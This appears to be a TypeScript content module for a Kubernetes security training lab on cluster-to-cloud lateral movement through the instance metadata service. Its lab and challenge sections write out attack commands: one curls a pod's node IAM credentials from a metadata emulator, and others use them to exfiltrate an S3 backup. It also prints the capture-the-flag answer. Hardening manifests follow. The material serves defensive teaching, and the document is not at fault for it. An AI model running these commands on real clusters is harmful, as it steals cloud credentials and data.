import type { Risk } from "../types";

export const k08: Risk = {
  id: "K08",
  slug: "cluster-to-cloud-lateral-movement",
  title: "Cluster-to-Cloud Lateral Movement",
  severity: "Critical",
  tagline:
    "One pod on the node network reaches 169.254.169.254 and walks out of the cluster with the node's cloud keys.",
  icon: "☁️",

  overview: [
    "Managed Kubernetes (EKS, GKE, AKS) does not exist in a vacuum - it runs inside a cloud account. Every node is a cloud VM with its own cloud identity: an AWS instance profile / IAM role, a GCP service account, or an Azure managed identity. That identity is exposed to anything running on the node through the Instance Metadata Service (IMDS) at the link-local address `169.254.169.254`.",
    "Cluster-to-cloud lateral movement is the pivot from a foothold inside the cluster to the surrounding cloud account. The classic path is a compromised pod that can reach IMDS - over the pod network if the endpoint is not blocked, or directly if the pod shares the node's network namespace (`hostNetwork: true`). Hitting `http://169.254.169.254/latest/meta-data/iam/security-credentials/` returns temporary credentials for the *node's* role, which is usually far more powerful than any single workload needs.",
    "The other common path is credential sprawl: long-lived cloud keys (an `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` pair, a GCP service-account JSON via `GOOGLE_APPLICATION_CREDENTIALS`, an `AZURE_CLIENT_SECRET`) stuffed into a pod's environment or a mounted volume. Whoever compromises the pod inherits standing, over-broad cloud access - no metadata trick required.",
    "NimbusMart's `platform/data-exporter` shows the IMDS path: it was given `hostNetwork: true` 'to talk to the node metrics agent', which parked it on the node network right next to the metadata endpoint, with no egress policy to stop it from reading the node's cloud credentials.",
  ],
  impact: [
    "Cloud account takeover: the node role frequently has permissions well beyond the pod's needs (read all S3 buckets, describe/modify EC2, assume other roles), so stealing it escalates from one pod to broad cloud access.",
    "Data exfiltration from cloud storage: object stores, databases, and backups reachable by the node or workload identity become readable/writable.",
    "Privilege escalation across the account: node roles can often mint further credentials or touch the cluster's own control-plane cloud resources.",
    "Persistence outside the cluster: attackers create new cloud users, keys, or roles that survive any pod or node cleanup.",
    "Blast radius beyond Kubernetes: a single container RCE becomes a full cloud-account incident.",
  ],
  rootCauses: [
    "Pods can reach the instance metadata endpoint (169.254.169.254) because it is not blocked at the network layer.",
    "Workloads run with `hostNetwork: true`, placing them on the node's network namespace next to IMDS.",
    "IMDSv2 is not enforced and the metadata hop limit is left at the default, so containers can fetch node credentials.",
    "Nodes run with broad IAM roles / service accounts that every pod on the node transitively inherits.",
    "Long-lived cloud credentials are injected into pods via environment variables or mounted files instead of a scoped, short-lived identity.",
    "No per-pod cloud identity (IRSA / Workload Identity / Entra Workload ID), so all workloads share the node's identity.",
  ],

  attackScenario: {
    summary:
      "An attacker with code execution in one pod reaches the instance metadata service, steals the node's cloud credentials, and pivots into the cloud account.",
    steps: [
      "The attacker gets a shell in a workload pod (e.g. via an app RCE or SSRF).",
      "The pod runs with `hostNetwork: true` (or the metadata endpoint is simply not blocked), so it can reach `http://169.254.169.254/`.",
      "The attacker queries `.../latest/meta-data/iam/security-credentials/<node-role>` and receives temporary AWS credentials for the node's IAM role (equivalently GCP/Azure metadata).",
      "Those credentials are exported to the AWS CLI/SDK and used from anywhere - the attacker now acts as the node in the cloud account.",
      "With the node role's permissions the attacker reads S3 buckets, assumes other roles, or creates persistent cloud identities - the cluster foothold is now a cloud-account breach.",
    ],
  },

  challenge: {
    scenario:
      "You've landed a shell in NimbusMart's `platform/data-exporter` pod - and it ships the real `aws` CLI. It was launched with `hostNetwork: true` and no egress restriction, so it sits on the node's network right beside the cloud instance metadata service (IMDS). This range simulates the cloud with a real fake-AWS account (LocalStack) plus an IMDS emulator that hands out the *node's* IAM role credentials, exactly like an EKS node. NimbusMart's production database backups live in an S3 bucket in that account.",
    objective:
      "Steal the node's cloud credentials from IMDS, then use the `aws` CLI to pivot into the cloud account and exfiltrate the crown-jewel backup - `s3://nimbusmart-prod-backups/db-backup/credentials.txt`. Its contents are the flag.",
    difficulty: "Hard",
    points: 300,
    flagFormat: "FLAG{...}",
    flagHash: "018749c826685c1cf6f25145c2288e95ed0a5afda33bdebe36b607c3b20ad82a",
    hints: [
      "Why can this pod reach node-local endpoints at all? Check `hostNetwork` - the pod shares the node's network namespace.",
      "The `aws` CLI auto-discovers credentials from IMDS (the pod's `AWS_EC2_METADATA_SERVICE_ENDPOINT` points at the fake metadata service). You don't even need to copy keys by hand - just run an `aws` command and it pulls the node's role creds for you.",
      "Prove the pivot with `aws sts get-caller-identity`, then exfil: `aws s3 cp s3://nimbusmart-prod-backups/db-backup/credentials.txt -` (or `aws secretsmanager get-secret-value --secret-id nimbusmart/prod/db-master`).",
    ],
  },

  lab: {
    objective:
      "Pivot from the data-exporter pod to the (simulated) cloud metadata service, capture the node credentials, then redeploy a hardened version that cuts the pod-to-cloud path.",
    prerequisites: [
      "A local cluster: `kind create cluster --config labs/kind-cluster.yaml`",
      "kubectl configured to talk to that cluster",
    ],
    setupManifest: "labs/k08-cluster-to-cloud/setup.yaml",
    vulnerableManifest: "labs/k08-cluster-to-cloud/vulnerable.yaml",
    fixedManifest: "labs/k08-cluster-to-cloud/fixed.yaml",
    steps: [
      {
        title: "Stand up the fake cloud and deploy the vulnerable exporter",
        description:
          "The setup manifest brings up LocalStack (a fake AWS account seeded with the S3 backup + a Secrets Manager secret) and an IMDS emulator that hands out the node's IAM role credentials. The vulnerable pod is the hostNetwork `data-exporter` you compromised (it ships the `aws` CLI).",
        command:
          "kubectl apply -f labs/k08-cluster-to-cloud/setup.yaml && kubectl -n platform rollout status deploy/localstack && kubectl apply -f labs/k08-cluster-to-cloud/vulnerable.yaml",
        expected:
          "LocalStack seeds the account (bucket + secret), imds + data-exporter come up.",
        kind: "setup",
      },
      {
        title: "Confirm you're on the node's network",
        description:
          "The pod runs with hostNetwork: true, so it shares the node's network namespace - exactly what lets it reach the node-local metadata endpoint.",
        command:
          "kubectl get pod -n platform data-exporter -o jsonpath='{.spec.hostNetwork}{\"\\n\"}'",
        expected: "true - the pod is on the node network.",
        kind: "attack",
      },
      {
        title: "Steal the node's cloud credentials from IMDS",
        description:
          "Read the temporary credentials the metadata service hands out. imds.platform.svc.cluster.local stands in for http://169.254.169.254/latest/meta-data/iam/security-credentials/<node-role>.",
        command:
          "kubectl exec -n platform data-exporter -- curl -s http://imds.platform.svc.cluster.local/latest/meta-data/iam/security-credentials/nimbusmart-node-role",
        expected:
          'JSON with "AccessKeyId", "SecretAccessKey", and a session "Token" for nimbusmart-node-role.',
        kind: "attack",
      },
      {
        title: "Pivot into the cloud account",
        description:
          "The `aws` CLI auto-discovers those IMDS credentials. Prove you're now acting as the node in the cloud account.",
        command:
          "kubectl exec -n platform data-exporter -- aws sts get-caller-identity",
        expected: "An identity in account 000000000000 - you are the node now.",
        kind: "attack",
      },
      {
        title: "Exfiltrate the crown-jewel backup (capture the flag)",
        description:
          "Use the stolen node identity to read NimbusMart's production backup bucket. Its contents are the flag.",
        command:
          "kubectl exec -n platform data-exporter -- aws s3 cp s3://nimbusmart-prod-backups/db-backup/credentials.txt -",
        expected:
          "FLAG{pod_stole_node_cloud_credentials} - submit this on the Challenge tab. (Secrets Manager works too: aws secretsmanager get-secret-value --secret-id nimbusmart/prod/db-master --query SecretString --output text)",
        kind: "attack",
      },
      {
        title: "Clean up and deploy the hardened exporter",
        description:
          "The fixed manifest drops hostNetwork, sets AWS_EC2_METADATA_DISABLED so the SDK won't read IMDS, and adds a default-deny egress policy blocking the metadata CIDR - the pod-to-cloud path is cut.",
        command:
          "kubectl delete -f labs/k08-cluster-to-cloud/vulnerable.yaml && kubectl apply -f labs/k08-cluster-to-cloud/fixed.yaml",
        expected:
          'pod "data-exporter" deleted / pod/data-exporter created / networkpolicy created',
        kind: "fix",
      },
      {
        title: "Verify the pivot is blocked",
        description:
          "The hardened pod is off the node network and the SDK won't touch IMDS, so the cloud pivot fails. (kind's kindnet doesn't enforce the NetworkPolicy, so removing hostNetwork + disabling IMDS is what closes the path here - and what the checker asserts.)",
        command:
          "kubectl exec -n platform data-exporter -- aws sts get-caller-identity 2>&1 | head -1",
        expected: "Unable to locate credentials - the pivot is dead.",
        kind: "verify",
      },
    ],
  },

  defense: {
    summary:
      "Cut every path from a pod to the cloud identity: block the metadata endpoint, never share the node network, and give each workload its own scoped, short-lived cloud identity instead of the node role.",
    patches: [
      {
        title: "Give each workload its own scoped cloud identity",
        description:
          "Use IRSA / EKS Pod Identity (AWS), Workload Identity (GKE), or Entra Workload ID (AKS) so a pod assumes a least-privilege role via its ServiceAccount - no node-role inheritance, no static keys.",
        lang: "yaml",
        code: `apiVersion: v1
kind: ServiceAccount
metadata:
  name: data-exporter
  namespace: platform
  annotations:
    # AWS IRSA: bind this SA to a narrowly-scoped IAM role.
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789012:role/data-exporter-readonly
    # GKE Workload Identity equivalent:
    # iam.gke.io/gcp-service-account: data-exporter@project.iam.gserviceaccount.com`,
      },
      {
        title: "Block the metadata endpoint and never share the node network",
        description:
          "Deny egress by default and explicitly block the metadata CIDR, and never set hostNetwork on application workloads.",
        lang: "yaml",
        code: `# Pod spec - safe defaults
hostNetwork: false        # never join the node's network namespace
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-imds
  namespace: platform
spec:
  podSelector: {}
  policyTypes: ["Egress"]
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except: ["169.254.169.254/32"]   # block the metadata service`,
      },
      {
        title: "Enforce IMDSv2 and a hop limit of 1",
        description:
          "On AWS nodes require IMDSv2 (session tokens) and set the metadata hop limit to 1 so packets from pods cannot reach the metadata service at all.",
        lang: "hcl",
        code: `# EKS managed node group / launch template metadata options
metadata_options {
  http_endpoint               = "enabled"
  http_tokens                 = "required"   # IMDSv2 only
  http_put_response_hop_limit = 1            # pods can't reach IMDS
}`,
      },
    ],
    bestPractices: [
      "Assign per-pod cloud identities (IRSA / Workload Identity / Entra Workload ID); never rely on the node role for workload access.",
      "Scope every cloud role to least privilege - the node role especially should be minimal.",
      "Enforce IMDSv2 and set the metadata hop limit to 1 so pods cannot reach 169.254.169.254.",
      "Block the metadata CIDR (169.254.169.254/32) with a default-deny egress NetworkPolicy on a CNI that enforces it (Calico, Cilium).",
      "Forbid hostNetwork for application workloads via Pod Security Standards or a policy engine (OPA/Gatekeeper, Kyverno).",
      "Never inject long-lived cloud keys (AWS_SECRET_ACCESS_KEY, GOOGLE_APPLICATION_CREDENTIALS, AZURE_CLIENT_SECRET) into pod env or volumes.",
      "Alert on cloud API calls made from node/instance credentials that originate from pod IP ranges.",
    ],
  },

  checker: {
    checkId: "k08",
    whatItChecks:
      "Scans all non-system pods for cluster-to-cloud pivot paths: workloads on the node network (hostNetwork: true) that can reach the instance metadata service, and containers that carry over-broad cloud credentials in their environment.",
    passCriteria: [
      "No pod runs with hostNetwork: true.",
      "No container injects a cloud-credential env var (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN, GOOGLE_APPLICATION_CREDENTIALS, AZURE_CLIENT_SECRET) - whether by literal value or valueFrom.",
    ],
  },

  references: [
    {
      label: "OWASP K8s Top 10 (2025) - K08 Cluster-to-Cloud Lateral Movement",
      url: "https://owasp.org/www-project-kubernetes-top-ten/",
    },
    {
      label: "AWS - IAM Roles for Service Accounts (IRSA)",
      url: "https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html",
    },
    {
      label: "AWS - EKS security best practices (restrict IMDS access)",
      url: "https://docs.aws.amazon.com/eks/latest/userguide/best-practices-security.html",
    },
    {
      label: "GKE - Workload Identity Federation for GKE",
      url: "https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity",
    },
    {
      label: "AKS - Microsoft Entra Workload ID",
      url: "https://learn.microsoft.com/en-us/azure/aks/workload-identity-overview",
    },
  ],
};
